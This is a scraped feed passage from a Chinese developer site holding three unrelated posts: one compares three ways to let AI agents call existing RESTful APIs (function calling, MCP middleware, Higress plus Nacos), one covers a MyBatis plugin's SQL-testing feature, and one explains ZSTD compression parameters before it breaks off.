.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d9e87a3b95c4aa993b816be08a6bbdf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6LaK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879035&amp;x-signature=%2FTO%2FrX0wj22bwY109xC3E%2F8Yf3Q%3D" alt="" loading="lazy"/></p>
<p>随着AI技术的飞速普及，越来越多企业开始接入AI Agent，希望借助自然语言交互的便捷性，给用户带来更流畅的使用体验。但很多企业都会遇到一个共性难题：<strong>原本运行稳定的传统Restful API，怎么才能快速让AI Agent调用起来？</strong></p>
<p>我们不妨先回想一下传统Restful API的使用场景：过去，这些API的调用全靠按钮触发，比如用户要下单，就得手动点击“创建订单”按钮，系统再调用对应的API完成操作；而现在有了AI Agent，用户只需说一句“帮我下单买XX商品”，就能实现自然交互，但尴尬的是——AI Agent能听懂用户的需求，却没法直接调用传统API去执行下单、支付、查询等具体功能，相当于“有嘴说，没手做”，这也让AI Agent的价值大打折扣。</p>
<p>今天，就给大家分享3种实用方案，帮你快速打通传统Restful API与AI Agent的衔接，兼顾效率与实用性，新手也能轻松理解！</p>
<h2 data-id="heading-0">一、3种核心集成方案（优缺点一目了然）</h2>
<p>结合企业实际开发场景（从小项目到大微服务架构），我们整理了3种最常用的集成方案，每种方案都明确了适用场景、优点和缺点，可以按需选择，避开踩坑！</p>
<h3 data-id="heading-1">方案1：直接使用AI Function Call调用后端API</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7bd80c5f7804a4dbdf29f94f5e06364~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6LaK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879035&amp;x-signature=1b9fJMDea40zcT%2F5s35M4JdtiuM%3D" alt="" loading="lazy"/></p>
<p>这是最基础、最快捷的集成方式，核心逻辑就是：将传统Restful API的调用逻辑，封装成AI Agent能识别的<strong>Function（函数）</strong>，当用户触发相关需求时，AI Agent直接调用对应Function，进而触发后端API执行操作（比如查询订单、发起支付）。</p>
<h4 data-id="heading-2">核心优缺点</h4>
<ul>
<li>
<p><strong>优点</strong>：集成门槛极低、速度最快，不需要额外开发中间服务，几行代码就能完成封装。如果是小型项目（比如只有几个API、没有复杂微服务），用这种方式最省心，能快速实现AI Agent与API的衔接，不用投入过多人力和时间成本。</p>
</li>
<li>
<p><strong>缺点</strong>：扩展性极差，只适合小项目。一旦项目规模扩大，采用微服务架构（比如订单、用户、支付等模块分别由不同团队开发），问题就会凸显——要让AI Agent调用所有模块的API，就需要所有微服务团队都参与到AI Agent的开发中，把各自的API封装成Function，不仅沟通成本极高，还会导致AI Agent的代码越来越臃肿，难以维护，完全不符合现代软件“分工协作、独立部署”的开发模式。</p>
</li>
</ul>
<h3 data-id="heading-3">方案2：创建MCP服务作为中间层衔接</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad36659168f543ccb1fc8b51535c89b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6LaK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879035&amp;x-signature=49vHmQ0Gz9%2FPHx7%2FnSs2rg0Z%2Bp0%3D" alt="" loading="lazy"/></p>
<p>针对微服务架构的痛点，这种方案应运而生——核心逻辑是：为每个微服务（订单、用户、支付等），单独创建一个<strong>MCP服务（中间通信服务）</strong>，MCP服务专门负责接收AI Agent的调用请求，再将请求转换为后端Restful API能识别的格式，同时处理API的返回结果，再反馈给AI Agent。简单说，MCP服务就是AI Agent和传统API之间的“翻译官”，让两者能顺畅沟通。</p>
<h4 data-id="heading-4">核心优缺点</h4>
<ul>
<li>
<p><strong>优点</strong>：完全适配微服务架构，分工清晰、互不干扰。每个微服务团队可以独立开发自己的MCP服务，不用参与AI Agent的开发，只需保证自己的MCP服务能正常调用本团队的API即可，既能提升开发效率，又能降低沟通成本，后续微服务升级、API迭代时，也不会影响到AI Agent，维护起来更轻松，符合现代软件的开发模式。</p>
</li>
<li>
<p><strong>缺点</strong>：需要额外投入人力和资源成本。每个微服务都要开发对应的MCP服务，还要做测试、部署、维护，对于资源紧张的中小企业来说，会增加一定的负担；如果微服务数量较多，MCP服务的管理也会带来少量额外成本。</p>
</li>
</ul>
<h3 data-id="heading-5">方案3：使用Higress + Nacos，直接将传统API转换为MCP服务</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1856e56966b4efa8396c5615179d8fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6LaK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879035&amp;x-signature=%2BSZyzXdyPQba92N3jW4cX8GnwEQ%3D" alt="" loading="lazy"/></p>
<p>这是兼顾效率和成本的“最优解”之一，核心逻辑是：借助**Higress（网关工具）<strong>和</strong>Nacos（服务注册中心）**的原生能力，不用手动开发MCP服务，通过简单的配置操作，就能直接将传统Restful API转换为AI Agent能识别的MCP服务，相当于“零代码/少代码”完成集成。</p>
<p>简单说，就是利用现成的工具，自动完成“翻译官”（MCP服务）的创建，不用每个团队单独开发，大大节省人力成本。</p>
<h4 data-id="heading-6">核心优缺点</h4>
<ul>
<li>
<p><strong>优点</strong>：效率最高、成本最低。理想情况下，不用编写一行代码，只需在Higress和Nacos上做一些配置（比如注册API、设置转换规则），就能完成传统API到MCP服务的转换，适配AI Agent的调用；同时，不影响原有微服务的架构，后续API迭代时，只需调整配置即可，维护成本极低。</p>
</li>
<li>
<p><strong>缺点</strong>：对现有项目有一定的环境要求，有少量改造成本。① 如果项目中有大量API，配置的维护依然需要投入一定的人力；② 老项目如果没有使用Nacos（或其他服务注册中心），就需要额外部署Nacos并改造项目，让API支持服务注册；③ 需要使用最新版本的Higress和Nacos，老项目的相关组件版本过低时，需要升级组件，可能会带来短暂的不稳定风险（比如兼容性问题）。</p>
</li>
</ul>
<h2 data-id="heading-7">二、方案选型指南（按需选择，不踩坑）</h2>
<p>很多企业纠结“选哪种方案”，核心还是看<strong>项目规模、微服务架构、人力资源</strong>这3个关键因素，这里给大家明确的选型建议，直接对号入座即可：</p>
<ol>
<li>
<p>如果是<strong>小型项目</strong>（无复杂微服务，API数量少，比如个人项目、小型工具类产品）：优先选【方案1：AI Function Call直接调用】，快速落地，节省成本，不用过度设计架构。</p>
</li>
<li>
<p>如果是<strong>中大型项目</strong>（采用微服务架构，多个团队分工开发，API数量多，需要长期维护）：优先选【方案2：创建MCP服务】，虽然前期有开发成本，但长期来看，能保证架构的灵活性和可维护性，避免后续出现“牵一发而动全身”的问题。</p>
</li>
<li>
<p>如果是<strong>中大型项目，且希望节省人力成本、快速落地</strong>（现有项目已使用Nacos，组件版本较新）：优先选【方案3：Higress + Nacos转换】，不用开发MCP服务，通过配置就能完成集成，兼顾效率和实用性；如果项目未使用Nacos，可评估改造成本，若改造简单，也可优先选择此方案。</p>
</li>
</ol>
<blockquote>
<p>🔔 补充提醒：如果企业前期不确定哪种方案更合适，可先采用方案1快速验证场景（比如先让AI Agent调用1-2个核心API），后续随着项目规模扩大，再逐步迁移到方案2或方案3，降低试错成本。</p>
</blockquote>
<h2 data-id="heading-8">三、总结：高效集成的核心逻辑</h2>
<p>传统Restful API集成AI Agent，核心不是“重构API”，而是“打通衔接通道”——让AI Agent能顺利调用API、获取返回结果，同时不影响原有系统的稳定性和可维护性。</p>
<p>我们梳理的3种方案，本质上是“从简单到复杂、从快速落地到长期适配”的梯度选择：方案1适合快速验证，方案2适合长期维护，方案3适合兼顾效率与成本。</p>
<p>最后提醒大家：集成时不用追求“最先进”，而是要“最适配”——结合自己的项目规模、人力成本，选择能快速落地、后续好维护的方案，就是最优解。只要打通了传统API与AI Agent的衔接，就能让AI Agent真正“落地可用”，既保留原有系统的稳定性，又能借助AI的优势，提升用户体验和业务效率。</p>
<h2 data-id="heading-9">参考资料</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fjava2ai.com%2Fintegration%2Fmcps%2Fnacos%2Fspring-ai-alibaba-mcp-nacos-introduce" target="_blank" title="https://java2ai.com/integration/mcps/nacos/spring-ai-alibaba-mcp-nacos-introduce" ref="nofollow noopener noreferrer">java2ai.com/integration…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fnacos.io%2Fdocs%2Flatest%2Fmanual%2Fuser%2Fai%2Fapi-to-mcp%2F%3Fspm%3D5238cd80.6a33be36.0.0.2f431e5d0fwVgN%26source%3Dblog" target="_blank" title="https://nacos.io/docs/latest/manual/user/ai/api-to-mcp/?spm=5238cd80.6a33be36.0.0.2f431e5d0fwVgN&amp;source=blog" ref="nofollow noopener noreferrer">nacos.io/docs/latest…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MybatisTools—— 直接运行测试 sql]]></title>    <link>https://juejin.cn/post/7602936997175099444</link>    <guid>https://juejin.cn/post/7602936997175099444</guid>    <pubDate>2026-02-05T06:54:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602936997175099444" data-draft-id="7602916013877641231" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MybatisTools—— 直接运行测试 sql"/> <meta itemprop="keywords" content="IntelliJ IDEA,MyBatis"/> <meta itemprop="datePublished" content="2026-02-05T06:54:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="碧玉笙"/> <meta itemprop="url" content="https://juejin.cn/user/3263006244611949"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MybatisTools—— 直接运行测试 sql
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3263006244611949/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    碧玉笙
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:54:20.000Z" title="Thu Feb 05 2026 06:54:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本次更新主要是适配新版本（2025.2+），另外带来几个新功能。</p>
<p>还不知道这个插件干什么的可以参考这篇文章<code>[MybatisTools 使用手册](https://www.toutiao.com/article/7431384971811553846/?log_from=d4b7047673e2b8_1770197767606)</code>。本篇仅讲更新的功能：运行和测试 sql。</p>
<p>在 mapper 的 xml或者接口类里鼠标右键点击左侧 icon
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f125308f523c4d21bbf67f4507f876ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Kn546J56yZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879260&amp;x-signature=kvaDn1J96QzEgVn%2FUdrC%2FpRvC4E%3D" alt="image.png" loading="lazy"/>
在弹出的窗口里输入参数，点击 transform 可以查看 sql 是否正确，如果没有问题则可以直接点击 run 进行执行
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66778d11e6f8420db7f3b75a9951884a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Kn546J56yZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879260&amp;x-signature=3ekZICvBsbR4TIKNp2irOykqcbw%3D" alt="image.png" loading="lazy"/>
点击 run 按钮可以得到结果
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c55b86de72114325a14361d009bca797~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Kn546J56yZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879260&amp;x-signature=0wStQQ8lMGvXNYwWe47Msq8g870%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ZSTD接口不同的参数组合的效果]]></title>    <link>https://juejin.cn/post/7602936997175115828</link>    <guid>https://juejin.cn/post/7602936997175115828</guid>    <pubDate>2026-02-05T06:55:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602936997175115828" data-draft-id="7602931486597513251" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ZSTD接口不同的参数组合的效果"/> <meta itemprop="keywords" content="C++"/> <meta itemprop="datePublished" content="2026-02-05T06:55:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一只公羊"/> <meta itemprop="url" content="https://juejin.cn/user/928423275930535"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ZSTD接口不同的参数组合的效果
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/928423275930535/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一只公羊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:55:45.000Z" title="Thu Feb 05 2026 06:55:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Zstandard (ZSTD) 这种压缩算法之所以在工业界大放异彩，核心就在于它的<strong>高度可定制性</strong>。它不仅仅提供 1-22 级的压缩等级，还允许开发者深入底层，像调音师一样调整各项参数。</p>
<p>以下是 ZSTD 接口参数的深度解析、组合效果及代码示例。</p>
<hr/>
<h2 data-id="heading-0">1. 核心基础参数：压缩等级 (Compression Level)</h2>
<p>这是最常用的参数，决定了压缩速度与压缩率之间的平衡。</p>
<ul>
<li>
<p><strong>范围</strong>：1 到 22。</p>
<ul>
<li><strong>1-3</strong>：快速模式，适用于对延迟极其敏感的场景（如日志实时传输）。</li>
<li><strong>4-15</strong>：平衡模式，适用于通用的文件存储。</li>
<li><strong>16-22 (Ultra)</strong> ：极致模式，消耗大量 CPU 和内存，换取最小的体积（适用于冷备份、安装包）。</li>
</ul>
</li>
<li>
<p><strong>负数等级</strong>：ZSTD 支持 <code>--fast</code> 模式（如 -1 到 -5），比等级 1 更快，牺牲更多压缩率。</p>
</li>
</ul>
<hr/>
<h2 data-id="heading-1">2. 进阶微调参数 (ZSTD_cParameter)</h2>
<p>当你使用 <code>ZSTD_CCtx_setParameter()</code> 接口时，可以精细控制压缩引擎的内部行为。</p>








































<table><thead><tr><th><strong>参数名 (C API)</strong></th><th><strong>功能描述</strong></th><th><strong>效果说明</strong></th></tr></thead><tbody><tr><td><code>ZSTD_c_windowLog</code></td><td>查找窗口大小 (<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>x</mi></msup></mrow><annotation encoding="application/x-tex">2^x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"/><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span></span></span></span></span> 字节)</td><td><strong>核心参数</strong>。值越大，能匹配到的重复数据越远，压缩率越高，但解压/压缩内存占用翻倍。</td></tr><tr><td><code>ZSTD_c_hashLog</code></td><td>哈希表大小</td><td>影响哈希碰撞率。调大可提升搜索效率，适合大文件。</td></tr><tr><td><code>ZSTD_c_chainLog</code></td><td>搜索链长度</td><td>决定了在哈希冲突时搜索的深度。越大越慢，但压缩率越高。</td></tr><tr><td><code>ZSTD_c_searchLog</code></td><td>搜索范围</td><td>限制搜索次数。值越大，搜索越彻底。</td></tr><tr><td><code>ZSTD_c_minMatch</code></td><td>最小匹配长度</td><td>通常为 3-7。值越小，能发现的细微重复越多（压缩率高），但处理变慢。</td></tr><tr><td><code>ZSTD_c_strategy</code></td><td>搜索策略</td><td>从 <code>Fast</code> 到 <code>BTUltra2</code>。策略越复杂，压缩质量越高，耗时呈指数增长。</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">3. 特色功能参数</h2>
<h3 data-id="heading-3">A. 多线程参数 (<code>ZSTD_c_nbWorkers</code>)</h3>
<p>ZSTD 原生支持并行压缩。</p>
<ul>
<li><strong>效果</strong>：设置为 <code>n</code> 时，会将数据分成多个块并行处理。</li>
<li><strong>注意</strong>：多线程会略微降低压缩率（因为块之间存在边界），但会极大地缩短压缩时间。</li>
</ul>
<h3 data-id="heading-4">B. 远程匹配 (Long Distance Matching - LDM)</h3>
<ul>
<li><strong>参数</strong>：<code>ZSTD_c_enableLongDistanceMatching</code></li>
